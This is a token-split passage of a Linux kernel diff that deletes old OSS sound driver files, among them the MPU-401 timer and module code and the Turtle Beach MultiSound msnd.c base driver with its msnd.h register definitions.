"midi_dev", ")", ";", "STORE", "(", "SEQ_CONTINUE_TIMER", "(", "))", ";", "}", "break", ";", "case", "TMR_SPP", ":", "printk", "(", "\"", "Songpos", ":", "%", "d", "\\", "n", "\"", ",", "parm", ")", ";", "if", "(", "timer_mode", "&", "TMR_EXTERNAL", ")", "{", "STORE", "(", "SEQ_SONGPOS", "(", "parm", ")", ");", "}", "break", ";", "}", "}", "static", "int", "mpu_timer_init", "(", "int", "midi_dev", ")", "{", "struct", "mpu_config", "*", "devc", ";", "int", "n", ";", "devc", "=", "&", "dev_conf", "[", "midi_dev", "]", ";", "if", "(", "timer_initialized", ")", "return", "-", "1", ";", "/", "*", "There", "is", "already", "a", "similar", "timer", "*", "/", "timer_initialized", "=", "1", ";", "mpu_timer", ".", "devlink", "=", "midi_dev", ";", "dev_conf", "[", "midi_dev", "]", ".", "timer_flag", "=", "1", ";", "n", "=", "sound_alloc_timerdev", "(", ");", "if", "(", "n", "=", "=", "-", "1", ")", "n", "=", "0", ";", "sound_timer_devs", "[", "n", "]", "=", "&", "mpu_timer", ";", "if", "(", "devc", "-", ">", "version", "<", "0x20", ")", "/", "*", "Original", "MPU", "-", "401", "*", "/", "timer_caps", "=", "TMR_INTERNAL", "|", "TMR_EXTERNAL", "|", "TMR_MODE_FSK", "|", "TMR_MODE_MIDI", ";", "else", "{", "/", "*", "*", "The", "version", "number", "2", ".", "0", "is", "used", "(", "at", "least", ")", "by", "the", "*", "MusicQuest", "cards", "and", "the", "Roland", "Super", "-", "MPU", ".", "*", "*", "MusicQuest", "has", "given", "a", "special", "meaning", "to", "the", "bits", "of", "the", "*", "revision", "number", ".", "The", "Super", "-", "MPU", "returns", "0", ".", "*", "/", "if", "(", "devc", "-", ">", "revision", ")", "timer_caps", "|", "=", "TMR_EXTERNAL", "|", "TMR_MODE_MIDI", ";", "if", "(", "devc", "-", ">", "revision", "&", "0x02", ")", "timer_caps", "|", "=", "TMR_MODE_CLS", ";", "if", "(", "devc", "-", ">", "revision", "&", "0x40", ")", "max_timebase", "=", "10", ";", "/", "*", "Has", "the", "216", "and", "240", "ppqn", "modes", "*", "/", "}", "timer_mode", "=", "(", "TMR_INTERNAL", "|", "TMR_MODE_MIDI", ")", "&", "timer_caps", ";", "return", "n", ";", "}", "EXPORT_SYMBOL", "(", "probe_mpu401", ")", ";", "EXPORT_SYMBOL", "(", "attach_mpu401", ")", ";", "EXPORT_SYMBOL", "(", "unload_mpu401", ")", ";", "static", "struct", "address_info", "cfg", ";", "static", "int", "io", "=", "-", "1", ";", "static", "int", "irq", "=", "-", "1", ";", "module_param_hw", "(", "irq", ",", "int", ",", "irq", ",", "0", ")", ";", "module_param_hw", "(", "io", ",", "int", ",", "ioport", ",", "0", ")", ";", "static", "int", "__init", "init_mpu401", "(", "void", ")", "{", "int", "ret", ";", "/", "*", "Can", "be", "loaded", "either", "for", "module", "use", "or", "to", "provide", "functions", "to", "others", "*", "/", "if", "(", "io", "!", "=", "-", "1", "&", "&", "irq", "!", "=", "-", "1", ")", "{", "struct", "resource", "*", "ports", ";", "cfg", ".", "irq", "=", "irq", ";", "cfg", ".", "io_base", "=", "io", ";", "ports", "=", "request_region", "(", "io", ",", "2", ",", "\"", "mpu401", "\"", ");", "if", "(", "!", "ports", ")", "return", "-", "EBUSY", ";", "if", "(", "probe_mpu401", "(", "&", "cfg", ",", "ports", ")", "=", "=", "0", ")", "{", "release_region", "(", "io", ",", "2", ")", ";", "return", "-", "ENODEV", ";", "}", "if", "(", "(", "ret", "=", "attach_mpu401", "(", "&", "cfg", ",", "THIS_MODULE", ")", "))", "return", "ret", ";", "}", "return", "0", ";", "}", "static", "void", "__exit", "cleanup_mpu401", "(", "void", ")", "{", "if", "(", "io", "!", "=", "-", "1", "&", "&", "irq", "!", "=", "-", "1", ")", "{", "/", "*", "Check", "for", "use", "by", ",", "for", "example", ",", "sscape", "driver", "*", "/", "unload_mpu401", "(", "&", "cfg", ")", ";", "}", "}", "module_init", "(", "init_mpu401", ")", ";", "module_exit", "(", "cleanup_mpu401", ")", ";", "#", "ifndef", "MODULE", "static", "int", "__init", "setup_mpu401", "(", "char", "*", "str", ")", "{", "/", "*", "io", ",", "irq", "*", "/", "int", "ints", "[", "3", "]", ";", "str", "=", "get_options", "(", "str", ",", "ARRAY_SIZE", "(", "ints", ")", ",", "ints", ")", ";", "io", "=", "ints", "[", "1", "]", ";", "irq", "=", "ints", "[", "2", "]", ";", "return", "1", ";", "}", "__setup", "(", "\"", "mpu401", "=", "\",", "setup_mpu401", ")", ";", "#", "endif", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "@", "@", "-", "1", ",", "11", "+", "0", ",", "0", "@", "@", "/", "*", "From", "uart401", ".", "c", "*", "/", "int", "probe_uart401", "(", "struct", "address_info", "*", "hw_config", ",", "struct", "module", "*", "owner", ")", ";", "void", "unload_uart401", "(", "struct", "address_info", "*", "hw_config", ")", ";", "irqreturn_t", "uart401intr", "(", "int", "irq", ",", "void", "*", "dev_id", ")", ";", "/", "*", "From", "mpu401", ".", "c", "*", "/", "int", "probe_mpu401", "(", "struct", "address_info", "*", "hw_config", ",", "struct", "resource", "*", "ports", ")", ";", "int", "attach_mpu401", "(", "struct", "address_info", "*", "hw_config", ",", "struct", "module", "*", "owner", ")", ";", "void", "unload_mpu401", "(", "struct", "address_info", "*", "hw_info", ")", ";", "@", "@", "-", "1", ",", "413", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "msnd", ".", "c", "-", "Driver", "Base", "*", "*", "Turtle", "Beach", "MultiSound", "Sound", "Card", "Driver", "for", "Linux", "*", "*", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "vmalloc", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "mm", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "#", "include", "<", "linux", "/", "uaccess", ".", "h", ">", "#", "include", "<", "linux", "/", "spinlock", ".", "h", ">", "#", "include", "<", "asm", "/", "irq", ".", "h", ">", "#", "include", "\"", "msnd", ".", "h", "\"", "#", "define", "LOGNAME", "\"", "msnd", "\"", "#", "define", "MSND_MAX_DEVS", "4", "static", "multisound_dev_t", "*", "devs", "[", "MSND_MAX_DEVS", "]", ";", "static", "int", "num_devs", ";", "int", "msnd_register", "(", "multisound_dev_t", "*", "dev", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "MSND_MAX_DEVS", ";", "+", "+", "i", ")", "if", "(", "devs", "[", "i", "]", "=", "=", "NULL", ")", "break", ";", "if", "(", "i", "=", "=", "MSND_MAX_DEVS", ")", "return", "-", "ENOMEM", ";", "devs", "[", "i", "]", "=", "dev", ";", "+", "+", "num_devs", ";", "return", "0", ";", "}", "void", "msnd_unregister", "(", "multisound_dev_t", "*", "dev", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "MSND_MAX_DEVS", ";", "+", "+", "i", ")", "if", "(", "devs", "[", "i", "]", "=", "=", "dev", ")", "break", ";", "if", "(", "i", "=", "=", "MSND_MAX_DEVS", ")", "{", "printk", "(", "KERN_WARNING", "LOGNAME", "\"", ":", "Unregistering", "unknown", "device", "\\", "n", "\"", ");", "return", ";", "}", "devs", "[", "i", "]", "=", "NULL", ";", "-", "-", "num_devs", ";", "}", "void", "msnd_init_queue", "(", "void", "__iomem", "*", "base", ",", "int", "start", ",", "int", "size", ")", "{", "writew", "(", "PCTODSP_BASED", "(", "start", ")", ",", "base", "+", "JQS_wStart", ")", ";", "writew", "(", "PCTODSP_OFFSET", "(", "size", ")", "-", "1", ",", "base", "+", "JQS_wSize", ")", ";", "writew", "(", "0", ",", "base", "+", "JQS_wHead", ")", ";", "writew", "(", "0", ",", "base", "+", "JQS_wTail", ")", ";", "}", "void", "msnd_fifo_init", "(", "msnd_fifo", "*", "f", ")", "{", "f", "-", ">", "data", "=", "NULL", ";", "}", "void", "msnd_fifo_free", "(", "msnd_fifo", "*", "f", ")", "{", "vfree", "(", "f", "-", ">", "data", ")", ";", "f", "-", ">", "data", "=", "NULL", ";", "}", "int", "msnd_fifo_alloc", "(", "msnd_fifo", "*", "f", ",", "size_t", "n", ")", "{", "msnd_fifo_free", "(", "f", ")", ";", "f", "-", ">", "data", "=", "vmalloc", "(", "n", ")", ";", "f", "-", ">", "n", "=", "n", ";", "f", "-", ">", "tail", "=", "0", ";", "f", "-", ">", "head", "=", "0", ";", "f", "-", ">", "len", "=", "0", ";", "if", "(", "!", "f", "-", ">", "data", ")", "return", "-", "ENOMEM", ";", "return", "0", ";", "}", "void", "msnd_fifo_make_empty", "(", "msnd_fifo", "*", "f", ")", "{", "f", "-", ">", "len", "=", "f", "-", ">", "tail", "=", "f", "-", ">", "head", "=", "0", ";", "}", "int", "msnd_fifo_write_io", "(", "msnd_fifo", "*", "f", ",", "char", "__iomem", "*", "buf", ",", "size_t", "len", ")", "{", "int", "count", "=", "0", ";", "while", "(", "(", "count", "<", "len", ")", "&", "&", "(", "f", "-", ">", "len", "!", "=", "f", "-", ">", "n", ")", ")", "{", "int", "nwritten", ";", "if", "(", "f", "-", ">", "head", "<", "=", "f", "-", ">", "tail", ")", "{", "nwritten", "=", "len", "-", "count", ";", "if", "(", "nwritten", ">", "f", "-", ">", "n", "-", "f", "-", ">", "tail", ")", "nwritten", "=", "f", "-", ">", "n", "-", "f", "-", ">", "tail", ";", "}", "else", "{", "nwritten", "=", "f", "-", ">", "head", "-", "f", "-", ">", "tail", ";", "if", "(", "nwritten", ">", "len", "-", "count", ")", "nwritten", "=", "len", "-", "count", ";", "}", "memcpy_fromio", "(", "f", "-", ">", "data", "+", "f", "-", ">", "tail", ",", "buf", ",", "nwritten", ")", ";", "count", "+", "=", "nwritten", ";", "buf", "+", "=", "nwritten", ";", "f", "-", ">", "len", "+", "=", "nwritten", ";", "f", "-", ">", "tail", "+", "=", "nwritten", ";", "f", "-", ">", "tail", "%", "=", "f", "-", ">", "n", ";", "}", "return", "count", ";", "}", "int", "msnd_fifo_write", "(", "msnd_fifo", "*", "f", ",", "const", "char", "*", "buf", ",", "size_t", "len", ")", "{", "int", "count", "=", "0", ";", "while", "(", "(", "count", "<", "len", ")", "&", "&", "(", "f", "-", ">", "len", "!", "=", "f", "-", ">", "n", ")", ")", "{", "int", "nwritten", ";", "if", "(", "f", "-", ">", "head", "<", "=", "f", "-", ">", "tail", ")", "{", "nwritten", "=", "len", "-", "count", ";", "if", "(", "nwritten", ">", "f", "-", ">", "n", "-", "f", "-", ">", "tail", ")", "nwritten", "=", "f", "-", ">", "n", "-", "f", "-", ">", "tail", ";", "}", "else", "{", "nwritten", "=", "f", "-", ">", "head", "-", "f", "-", ">", "tail", ";", "if", "(", "nwritten", ">", "len", "-", "count", ")", "nwritten", "=", "len", "-", "count", ";", "}", "memcpy", "(", "f", "-", ">", "data", "+", "f", "-", ">", "tail", ",", "buf", ",", "nwritten", ")", ";", "count", "+", "=", "nwritten", ";", "buf", "+", "=", "nwritten", ";", "f", "-", ">", "len", "+", "=", "nwritten", ";", "f", "-", ">", "tail", "+", "=", "nwritten", ";", "f", "-", ">", "tail", "%", "=", "f", "-", ">", "n", ";", "}", "return", "count", ";", "}", "int", "msnd_fifo_read_io", "(", "msnd_fifo", "*", "f", ",", "char", "__iomem", "*", "buf", ",", "size_t", "len", ")", "{", "int", "count", "=", "0", ";", "while", "(", "(", "count", "<", "len", ")", "&", "&", "(", "f", "-", ">", "len", ">", "0", ")", ")", "{", "int", "nread", ";", "if", "(", "f", "-", ">", "tail", "<", "=", "f", "-", ">", "head", ")", "{", "nread", "=", "len", "-", "count", ";", "if", "(", "nread", ">", "f", "-", ">", "n", "-", "f", "-", ">", "head", ")", "nread", "=", "f", "-", ">", "n", "-", "f", "-", ">", "head", ";", "}", "else", "{", "nread", "=", "f", "-", ">", "tail", "-", "f", "-", ">", "head", ";", "if", "(", "nread", ">", "len", "-", "count", ")", "nread", "=", "len", "-", "count", ";", "}", "memcpy_toio", "(", "buf", ",", "f", "-", ">", "data", "+", "f", "-", ">", "head", ",", "nread", ")", ";", "count", "+", "=", "nread", ";", "buf", "+", "=", "nread", ";", "f", "-", ">", "len", "-", "=", "nread", ";", "f", "-", ">", "head", "+", "=", "nread", ";", "f", "-", ">", "head", "%", "=", "f", "-", ">", "n", ";", "}", "return", "count", ";", "}", "int", "msnd_fifo_read", "(", "msnd_fifo", "*", "f", ",", "char", "*", "buf", ",", "size_t", "len", ")", "{", "int", "count", "=", "0", ";", "while", "(", "(", "count", "<", "len", ")", "&", "&", "(", "f", "-", ">", "len", ">", "0", ")", ")", "{", "int", "nread", ";", "if", "(", "f", "-", ">", "tail", "<", "=", "f", "-", ">", "head", ")", "{", "nread", "=", "len", "-", "count", ";", "if", "(", "nread", ">", "f", "-", ">", "n", "-", "f", "-", ">", "head", ")", "nread", "=", "f", "-", ">", "n", "-", "f", "-", ">", "head", ";", "}", "else", "{", "nread", "=", "f", "-", ">", "tail", "-", "f", "-", ">", "head", ";", "if", "(", "nread", ">", "len", "-", "count", ")", "nread", "=", "len", "-", "count", ";", "}", "memcpy", "(", "buf", ",", "f", "-", ">", "data", "+", "f", "-", ">", "head", ",", "nread", ")", ";", "count", "+", "=", "nread", ";", "buf", "+", "=", "nread", ";", "f", "-", ">", "len", "-", "=", "nread", ";", "f", "-", ">", "head", "+", "=", "nread", ";", "f", "-", ">", "head", "%", "=", "f", "-", ">", "n", ";", "}", "return", "count", ";", "}", "static", "int", "msnd_wait_TXDE", "(", "multisound_dev_t", "*", "dev", ")", "{", "register", "unsigned", "int", "io", "=", "dev", "-", ">", "io", ";", "register", "int", "timeout", "=", "1000", ";", "while", "(", "timeout", "-", "-", ">", "0", ")", "if", "(", "msnd_inb", "(", "io", "+", "HP_ISR", ")", "&", "HPISR_TXDE", ")", "return", "0", ";", "return", "-", "EIO", ";", "}", "static", "int", "msnd_wait_HC0", "(", "multisound_dev_t", "*", "dev", ")", "{", "register", "unsigned", "int", "io", "=", "dev", "-", ">", "io", ";", "register", "int", "timeout", "=", "1000", ";", "while", "(", "timeout", "-", "-", ">", "0", ")", "if", "(", "!(", "msnd_inb", "(", "io", "+", "HP_CVR", ")", "&", "HPCVR_HC", ")", ")", "return", "0", ";", "return", "-", "EIO", ";", "}", "int", "msnd_send_dsp_cmd", "(", "multisound_dev_t", "*", "dev", ",", "BYTE", "cmd", ")", "{", "unsigned", "long", "flags", ";", "spin_lock_irqsave", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "msnd_wait_HC0", "(", "dev", ")", "=", "=", "0", ")", "{", "msnd_outb", "(", "cmd", ",", "dev", "-", ">", "io", "+", "HP_CVR", ")", ";", "spin_unlock_irqrestore", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "return", "0", ";", "}", "spin_unlock_irqrestore", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Send", "DSP", "command", "timeout", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "int", "msnd_send_word", "(", "multisound_dev_t", "*", "dev", ",", "unsigned", "char", "high", ",", "unsigned", "char", "mid", ",", "unsigned", "char", "low", ")", "{", "register", "unsigned", "int", "io", "=", "dev", "-", ">", "io", ";", "if", "(", "msnd_wait_TXDE", "(", "dev", ")", "=", "=", "0", ")", "{", "msnd_outb", "(", "high", ",", "io", "+", "HP_TXH", ")", ";", "msnd_outb", "(", "mid", ",", "io", "+", "HP_TXM", ")", ";", "msnd_outb", "(", "low", ",", "io", "+", "HP_TXL", ")", ";", "return", "0", ";", "}", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Send", "host", "word", "timeout", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "int", "msnd_upload_host", "(", "multisound_dev_t", "*", "dev", ",", "char", "*", "bin", ",", "int", "len", ")", "{", "int", "i", ";", "if", "(", "len", "%", "3", "!", "=", "0", ")", "{", "printk", "(", "KERN_WARNING", "LOGNAME", "\"", ":", "Upload", "host", "data", "not", "multiple", "of", "3", "!", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "len", ";", "i", "+", "=", "3", ")", "if", "(", "msnd_send_word", "(", "dev", ",", "bin", "[", "i", "]", ",", "bin", "[", "i", "+", "1", "]", ",", "bin", "[", "i", "+", "2", "]", ")", "!", "=", "0", ")", "return", "-", "EIO", ";", "msnd_inb", "(", "dev", "-", ">", "io", "+", "HP_RXL", ")", ";", "msnd_inb", "(", "dev", "-", ">", "io", "+", "HP_CVR", ")", ";", "return", "0", ";", "}", "int", "msnd_enable_irq", "(", "multisound_dev_t", "*", "dev", ")", "{", "unsigned", "long", "flags", ";", "if", "(", "dev", "-", ">", "irq_ref", "+", "+)", "return", "0", ";", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Enabling", "IRQ", "\\", "n", "\"", ");", "spin_lock_irqsave", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "msnd_wait_TXDE", "(", "dev", ")", "=", "=", "0", ")", "{", "msnd_outb", "(", "msnd_inb", "(", "dev", "-", ">", "io", "+", "HP_ICR", ")", "|", "HPICR_TREQ", ",", "dev", "-", ">", "io", "+", "HP_ICR", ")", ";", "if", "(", "dev", "-", ">", "type", "=", "=", "msndClassic", ")", "msnd_outb", "(", "dev", "-", ">", "irqid", ",", "dev", "-", ">", "io", "+", "HP_IRQM", ")", ";", "msnd_outb", "(", "msnd_inb", "(", "dev", "-", ">", "io", "+", "HP_ICR", ")", "&", "~", "HPICR_TREQ", ",", "dev", "-", ">", "io", "+", "HP_ICR", ")", ";", "msnd_outb", "(", "msnd_inb", "(", "dev", "-", ">", "io", "+", "HP_ICR", ")", "|", "HPICR_RREQ", ",", "dev", "-", ">", "io", "+", "HP_ICR", ")", ";", "enable_irq", "(", "dev", "-", ">", "irq", ")", ";", "msnd_init_queue", "(", "dev", "-", ">", "DSPQ", ",", "dev", "-", ">", "dspq_data_buff", ",", "dev", "-", ">", "dspq_buff_size", ")", ";", "spin_unlock_irqrestore", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "return", "0", ";", "}", "spin_unlock_irqrestore", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Enable", "IRQ", "failed", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "int", "msnd_disable_irq", "(", "multisound_dev_t", "*", "dev", ")", "{", "unsigned", "long", "flags", ";", "if", "(", "--", "dev", "-", ">", "irq_ref", ">", "0", ")", "return", "0", ";", "if", "(", "dev", "-", ">", "irq_ref", "<", "0", ")", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "IRQ", "ref", "count", "is", "%", "d", "\\", "n", "\"", ",", "dev", "-", ">", "irq_ref", ")", ";", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Disabling", "IRQ", "\\", "n", "\"", ");", "spin_lock_irqsave", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "msnd_wait_TXDE", "(", "dev", ")", "=", "=", "0", ")", "{", "msnd_outb", "(", "msnd_inb", "(", "dev", "-", ">", "io", "+", "HP_ICR", ")", "&", "~", "HPICR_RREQ", ",", "dev", "-", ">", "io", "+", "HP_ICR", ")", ";", "if", "(", "dev", "-", ">", "type", "=", "=", "msndClassic", ")", "msnd_outb", "(", "HPIRQ_NONE", ",", "dev", "-", ">", "io", "+", "HP_IRQM", ")", ";", "disable_irq", "(", "dev", "-", ">", "irq", ")", ";", "spin_unlock_irqrestore", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "return", "0", ";", "}", "spin_unlock_irqrestore", "(", "&", "dev", "-", ">", "lock", ",", "flags", ")", ";", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Disable", "IRQ", "failed", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "#", "ifndef", "LINUX20", "EXPORT_SYMBOL", "(", "msnd_register", ")", ";", "EXPORT_SYMBOL", "(", "msnd_unregister", ")", ";", "EXPORT_SYMBOL", "(", "msnd_init_queue", ")", ";", "EXPORT_SYMBOL", "(", "msnd_fifo_init", ")", ";", "EXPORT_SYMBOL", "(", "msnd_fifo_free", ")", ";", "EXPORT_SYMBOL", "(", "msnd_fifo_alloc", ")", ";", "EXPORT_SYMBOL", "(", "msnd_fifo_make_empty", ")", ";", "EXPORT_SYMBOL", "(", "msnd_fifo_write_io", ")", ";", "EXPORT_SYMBOL", "(", "msnd_fifo_read_io", ")", ";", "EXPORT_SYMBOL", "(", "msnd_fifo_write", ")", ";", "EXPORT_SYMBOL", "(", "msnd_fifo_read", ")", ";", "EXPORT_SYMBOL", "(", "msnd_send_dsp_cmd", ")", ";", "EXPORT_SYMBOL", "(", "msnd_send_word", ")", ";", "EXPORT_SYMBOL", "(", "msnd_upload_host", ")", ";", "EXPORT_SYMBOL", "(", "msnd_enable_irq", ")", ";", "EXPORT_SYMBOL", "(", "msnd_disable_irq", ")", ";", "#", "endif", "#", "ifdef", "MODULE", "MODULE_AUTHOR", "(", "\"", "Andrew", "Veliath", "<", "andrewtv", "@", "usa", ".", "net", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Turtle", "Beach", "MultiSound", "Driver", "Base", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "int", "init_module", "(", "void", ")", "{", "return", "0", ";", "}", "void", "cleanup_module", "(", "void", ")", "{", "}", "#", "endif", "@", "@", "-", "1", ",", "278", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "msnd", ".", "h", "*", "*", "Turtle", "Beach", "MultiSound", "Sound", "Card", "Driver", "for", "Linux", "*", "*", "Some", "parts", "of", "this", "header", "file", "were", "derived", "from", "the", "Turtle", "Beach", "*", "MultiSound", "Driver", "Development", "Kit", ".", "*", "*", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "*", "Copyright", "(", "C", ")", "1993", "Turtle", "Beach", "Systems", ",", "Inc", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "ifndef", "__MSND_H", "#", "define", "__MSND_H", "#", "define", "VERSION", "\"", "0", ".", "8", ".", "3", ".", "1", "\"", "#", "define", "DEFSAMPLERATE", "DSP_DEFAULT_SPEED", "#", "define", "DEFSAMPLESIZE", "AFMT_U8", "#", "define", "DEFCHANNELS", "1", "#", "define", "DEFFIFOSIZE", "128", "#", "define", "SNDCARD_MSND", "38", "#", "define", "SRAM_BANK_SIZE", "0x8000", "#", "define", "SRAM_CNTL_START", "0x7F00", "#", "define", "DSP_BASE_ADDR", "0x4000", "#", "define", "DSP_BANK_BASE", "0x4000", "#", "define", "HP_ICR", "0x00", "#", "define", "HP_CVR", "0x01", "#", "define", "HP_ISR", "0x02", "#", "define", "HP_IVR", "0x03", "#", "define", "HP_NU", "0x04", "#", "define", "HP_INFO", "0x04", "#", "define", "HP_TXH", "0x05", "#", "define", "HP_RXH", "0x05", "#", "define", "HP_TXM", "0x06", "#", "define", "HP_RXM", "0x06", "#", "define", "HP_TXL", "0x07", "#", "define", "HP_RXL", "0x07", "#", "define", "HP_ICR_DEF", "0x00", "#", "define", "HP_CVR_DEF", "0x12", "#", "define", "HP_ISR_DEF", "0x06", "#", "define", "HP_IVR_DEF", "0x0f", "#", "define", "HP_NU_DEF", "0x00", "#", "define", "HP_IRQM", "0x09", "#", "define", "HPR_BLRC", "0x08", "#", "define", "HPR_SPR1", "0x09", "#", "define", "HPR_SPR2", "0x0A", "#", "define", "HPR_TCL0", "0x0B", "#", "define", "HPR_TCL1", "0x0C", "#", "define", "HPR_TCL2", "0x0D", "#", "define", "HPR_TCL3", "0x0E", "#", "define", "HPR_TCL4", "0x0F", "#", "define", "HPICR_INIT", "0x80", "#", "define", "HPICR_HM1", "0x40", "#", "define", "HPICR_HM0", "0x20", "#", "define", "HPICR_HF1", "0x10", "#", "define", "HPICR_HF0", "0x08", "#", "define", "HPICR_TREQ", "0x02", "#", "define", "HPICR_RREQ", "0x01", "#", "define", "HPCVR_HC", "0x80", "#", "define", "HPISR_HREQ", "0x80", "#", "define", "HPISR_DMA", "0x40", "#", "define", "HPISR_HF3", "0x10", "#", "define", "HPISR_HF2", "0x08", "#", "define", "HPISR_TRDY", "0x04", "#", "define", "HPISR_TXDE", "0x02", "#", "define", "HPISR_RXDF", "0x01", "#", "define", "HPIO_290", "0", "#", "define", "HPIO_260", "1", "#", "define", "HPIO_250", "2", "#", "define", "HPIO_240", "3", "#", "define", "HPIO_230", "4", "#", "define", "HPIO_220", "5", "#", "define", "HPIO_210", "6", "#", "define", "HPIO_3E0", "7", "#", "define", "HPMEM_NONE", "0", "#", "define", "HPMEM_B000", "1", "#", "define", "HPMEM_C800", "2", "#", "define", "HPMEM_D000", "3", "#", "define", "HPMEM_D400", "4", "#", "define", "HPMEM_D800", "5", "#", "define", "HPMEM_E000", "6", "#", "define", "HPMEM_E800", "7", "#", "define", "HPIRQ_NONE", "0", "#", "define", "HPIRQ_5", "1", "#", "define", "HPIRQ_7", "2", "#", "define", "HPIRQ_9", "3", "#", "define", "HPIRQ_10", "4", "#", "define", "HPIRQ_11", "5", "#", "define", "HPIRQ_12", "6", "#", "define", "HPIRQ_15", "7", "#", "define", "HIMT_PLAY_DONE", "0x00", "#", "define", "HIMT_RECORD_DONE", "0x01", "#", "define", "HIMT_MIDI_EOS", "0x02", "#", "define", "HIMT_MIDI_OUT", "0x03", "#", "define", "HIMT_MIDI_IN_UCHAR", "0x0E", "#", "define", "HIMT_DSP", "0x0F", "#", "define", "HDEX_BASE", "0x92", "#", "define", "HDEX_PLAY_START", "(", "0", "+", "HDEX_BASE", ")", "#", "define", "HDEX_PLAY_STOP", "(", "1", "+", "HDEX_BASE", ")", "#", "define", "HDEX_PLAY_PAUSE", "(", "2", "+", "HDEX_BASE", ")", "#", "define", "HDEX_PLAY_RESUME", "(", "3", "+", "HDEX_BASE", ")", "#", "define", "HDEX_RECORD_START", "(", "4", "+", "HDEX_BASE", ")", "#", "define", "HDEX_RECORD_STOP", "(", "5", "+", "HDEX_BASE", ")", "#", "define", "HDEX_MIDI_IN_START", "(", "6", "+", "HDEX_BASE", ")", "#", "define", "HDEX_MIDI_IN_STOP", "(", "7", "+", "HDEX_BASE", ")", "#", "define", 